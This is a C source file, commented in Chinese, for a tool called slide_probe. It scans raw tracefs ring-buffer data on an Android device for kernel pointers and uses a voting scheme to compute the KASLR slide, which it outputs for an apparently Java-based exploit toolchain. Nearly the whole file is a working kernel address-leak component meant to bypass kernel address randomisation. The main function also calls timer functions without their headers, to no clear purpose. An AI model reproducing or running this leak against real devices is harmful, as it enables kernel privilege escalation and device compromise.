/*
 * slide_probe — perf 不可用时的后备：从 tracefs 的原始环形缓冲里捞内核指针，投票反解 slide。
 *
 * 与 perf_slide 共用同一套投票思路（text 段跨度只有十个左右 2MB 页，一个真指针只能由少数候选
 * slide 落入窗口），但数据源改成 /sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw。
 *
 * 局限：这条路径依赖 tracefs 对本进程可读，而且需要前面已经有 kprobe/事件在产生记录。
 * 拿不到任何指针时会直接报告失败，不会编造地址。
 *
 * 输出 calc=0x... 一行，Java 侧 KernelSupport.extractCalc() 认这个格式。
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>

#define MAX_POINTERS 8192
#define SLIDE_STEP 0x200000ULL
#define PROFILE_PATH "/data/local/tmp/lhasa_profile.txt"
#define KERNEL_LO 0xffffff8000000000ULL
#define KERNEL_HI 0xffffffff00000000ULL
#define MAX_CPUS 16

static uint64_t g_stext = 0xffffffc080010000ULL;
static uint64_t g_etext = 0xffffffc081360000ULL;
static uint64_t g_pointers[MAX_POINTERS];
static size_t g_pointer_count;

static void load_profile(void)
{
	struct utsname u;
	if (uname(&u) != 0)
		return;
	FILE *fp = fopen(PROFILE_PATH, "r");
	if (!fp)
		return;

	char *line = NULL;
	size_t cap = 0;
	char prefix[256];
	snprintf(prefix, sizeof(prefix), "release=%s ", u.release);

	while (getline(&line, &cap, fp) > 0) {
		if (strncmp(line, prefix, strlen(prefix)) != 0)
			continue;
		char *stext = strstr(line, "stext=");
		char *etext = strstr(line, "etext=");
		if (stext)
			g_stext = strtoull(stext + 6, NULL, 0);
		if (etext)
			g_etext = strtoull(etext + 6, NULL, 0);
		break;
	}
	free(line);
	fclose(fp);
}

static void scan_bytes(const unsigned char *data, size_t len)
{
	for (size_t off = 0; off + 8 <= len; off += 8) {
		uint64_t value;
		memcpy(&value, data + off, sizeof(value));
		if (value < KERNEL_LO || value >= KERNEL_HI)
			continue;
		if (g_pointer_count < MAX_POINTERS)
			g_pointers[g_pointer_count++] = value;
	}
}

static size_t read_cpu(int cpu)
{
	char path[128];
	snprintf(path, sizeof(path),
	         "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
	int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0) {
		printf("[slide] cpu%d %s\n", cpu, strerror(errno));
		return 0;
	}

	unsigned char buffer[65536];
	size_t total = 0;
	ssize_t n;
	while ((n = read(fd, buffer, sizeof(buffer))) > 0) {
		if (n > 0) {
			scan_bytes(buffer, (size_t)n);
			total += (size_t)n;
		}
		if (total > 4 * 1024 * 1024)
			break;
	}
	close(fd);

	if (total > 0)
		printf("[slide] raw cpu%d bytes=%zu hits=%zu\n", cpu, total, g_pointer_count);
	else
		printf("[slide] cpu%d %s\n", cpu, "无数据（tracefs 未产生记录）");
	return total;
}

int main(void)
{
	struct sigevent sev;
	timer_t timer;
	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_SIGNAL;
	sev.sigev_signo = SIGUSR1;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer) != 0)
		printf("[slide] timer_create errno=%d\n", errno);
	else
		timer_delete(timer);

	load_profile();

	int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (cpus <= 0 || cpus > MAX_CPUS)
		cpus = 1;

	size_t bytes = 0;
	for (int cpu = 0; cpu < cpus; cpu++)
		bytes += read_cpu(cpu);

	printf("[slide] lines=%zu\n", g_pointer_count);
	if (g_pointer_count == 0) {
		printf("[slide] 没有可用的内核指针，tracefs 路径在本机不可用\n");
		return 1;
	}

	uint64_t span = g_etext > g_stext ? g_etext - g_stext : 0x1350000ULL;
	unsigned windows = (unsigned)(span / SLIDE_STEP) + 1;

	size_t best_votes = 0;
	uint64_t best_slide = 0;
	for (size_t i = 0; i < g_pointer_count; i++) {
		uint64_t value = g_pointers[i];
		if (value < g_stext)
			continue;
		for (unsigned k = 0; k < windows; k++) {
			uint64_t slide = value - g_stext - (uint64_t)k * SLIDE_STEP;
			if (slide > 0x4000000000ULL)
				break;
			size_t votes = 0;
			for (size_t j = 0; j < g_pointer_count; j++) {
				uint64_t other = g_pointers[j] - slide;
				if (other >= g_stext && other < g_etext)
					votes++;
			}
			if (votes > best_votes) {
				best_votes = votes;
				best_slide = slide;
			}
		}
	}

	if (best_votes == 0 || (best_slide & (SLIDE_STEP - 1)) != 0) {
		printf("[slide] 无法计算 KASLR 偏移（%zu 字节，%zu 个指针）\n", bytes, g_pointer_count);
		return 1;
	}

	printf("[slide] votes=%zu/%zu\n", best_votes, g_pointer_count);
	printf("calc=0x%llx\n", (unsigned long long)best_slide);
	return 0;
}
